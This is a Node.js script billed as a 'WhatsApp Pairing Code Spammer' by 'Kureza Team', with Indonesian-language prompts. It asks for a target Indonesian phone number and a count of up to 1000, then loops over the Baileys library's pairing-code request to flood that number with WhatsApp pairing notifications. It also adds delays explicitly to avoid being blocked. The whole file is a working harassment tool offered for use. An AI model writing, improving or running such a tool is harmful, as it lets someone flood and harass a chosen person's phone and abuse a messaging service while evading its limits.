#!/usr/bin/env node
// pairing.js - WhatsApp Pairing Code Spammer
// By Kureza Team

const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const path = require('path');

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

// Banner
const banner = `
${wColor}╔══════════════════════════════════════════════════════╗
║                                                          ║
║   ██╗  ██╗██╗   ██╗██████╗ ███████╗███████╗  █████╗    ║
║   ██║ ██╔╝██║   ██║██╔══██╗╚══███╔╝╚══███╔╝██╔══██╗   ║
║   █████╔╝ ██║   ██║██████╔╝  ███╔╝   ███╔╝ ███████║   ║
║   ██╔═██╗ ██║   ██║██╔══██╗ ███╔╝   ███╔╝  ██╔══██║   ║
║   ██║  ██╗╚██████╔╝██║  ██║███████╗███████╗██║  ██║   ║
║   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ║
║                                                          ║
║   ███████╗██████╗  █████╗ ███╗   ███╗                   ║
║   ██╔════╝██╔══██╗██╔══██╗████╗ ████║                   ║
║   ███████╗██████╔╝███████║██╔████╔██║                   ║
║   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║                   ║
║   ███████║██║     ██║  ██║██║ ╚═╝ ██║                   ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝                   ║
║                                                          ║
║   WhatsApp Pairing Code Spammer v2.0                     ║
║   By Kureza Team                                         ║
╚══════════════════════════════════════════════════════════╝${xColor}
`;

async function spamPairing() {
    console.log(banner);
    console.log(`${wColor}┌────────────────────────────────────────────────────┐${xColor}`);
    console.log(`${wColor}│ ${xColor}📱 WhatsApp Pairing Code Spammer                     ${wColor}│${xColor}`);
    console.log(`${wColor}│ ${xColor}⚠️  Hanya untuk nomor Indonesia (+62)                 ${wColor}│${xColor}`);
    console.log(`${wColor}│ ${xColor}⚡ Gunakan dengan bijak!                               ${wColor}│${xColor}`);
    console.log(`${wColor}└────────────────────────────────────────────────────┘${xColor}`);
    console.log();

    // Create session directory if not exists
    const sessionDir = './pairing_session';
    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        const phoneNumber = await question(`${wColor}┃ ${xColor}📞 Target Number (62xxxxxxx) : ${wColor}`);
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        
        if (!cleanNumber.startsWith('62')) {
            console.log(`${wColor}┃ ${xColor}❌ Nomor harus diawali dengan 62 (Indonesia)!${wColor}`);
            console.log(`${wColor}└────────────────────────────────────────────────────┘${xColor}`);
            return;
        }

        const totalSpam = parseInt(await question(`${wColor}┃ ${xColor}🔢 Total Spam (1-1000) : ${wColor}`));
        
        if (isNaN(totalSpam) || totalSpam <= 0) {
            console.log(`${wColor}┃ ${xColor}❌ Harus angka positif!${wColor}`);
            console.log(`${wColor}└────────────────────────────────────────────────────┘${xColor}`);
            return;
        }

        if (totalSpam > 1000) {
            console.log(`${wColor}┃ ${xColor}⚠️ Maksimal 1000 spam!${wColor}`);
            console.log(`${wColor}└────────────────────────────────────────────────────┘${xColor}`);
            return;
        }

        console.log();
        console.log(`${wColor}┌────────────────────────────────────────────────────┐${xColor}`);
        console.log(`${wColor}│ ${xColor}🚀 Memulai Spam Pairing Code...                   ${wColor}│${xColor}`);
        console.log(`${wColor}│ ${xColor}📱 Target : ${cleanNumber}                         ${wColor}│${xColor}`);
        console.log(`${wColor}│ ${xColor}🔢 Total  : ${totalSpam}                           ${wColor}│${xColor}`);
        console.log(`${wColor}└────────────────────────────────────────────────────┘${xColor}`);
        console.log();

        let successCount = 0;
        let failCount = 0;

        for (let i = 0; i < totalSpam; i++) {
            try {
                let code = await sock.requestPairingCode(cleanNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                const statusColor = color[i % color.length];
                console.log(`${statusColor}┃ ${xColor}[${i + 1}/${totalSpam}] ✅ Pairing Code sent to ${cleanNumber}${xColor}`);
                successCount++;
                
                // Delay biar gak keblokir
                await new Promise(resolve => setTimeout(resolve, 500));
                
            } catch (error) {
                console.log(`${wColor}┃ ${xColor}[${i + 1}/${totalSpam}] ❌ Failed: ${error.message || 'Unknown error'}${xColor}`);
                failCount++;
                
                // Delay lebih lama kalo error
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log();
        console.log(`${wColor}╔══════════════════════════════════════════════════════╗${xColor}`);
        console.log(`${wColor}║ ${xColor}📊 HASIL SPAM PAIRING CODE                       ${wColor}║${xColor}`);
        console.log(`${wColor}╠══════════════════════════════════════════════════════╣${xColor}`);
        console.log(`${wColor}║ ${xColor}✅ Success : ${successCount}                                   ${wColor}║${xColor}`);
        console.log(`${wColor}║ ${xColor}❌ Failed  : ${failCount}                                   ${wColor}║${xColor}`);
        console.log(`${wColor}║ ${xColor}📱 Target : ${cleanNumber}                              ${wColor}║${xColor}`);
        console.log(`${wColor}╚══════════════════════════════════════════════════════╝${xColor}`);

    } catch (error) {
        console.error(`${wColor}┃ ${xColor}❌ Error: ${error.message}${xColor}`);
    }
}

// Jalankan
spamPairing();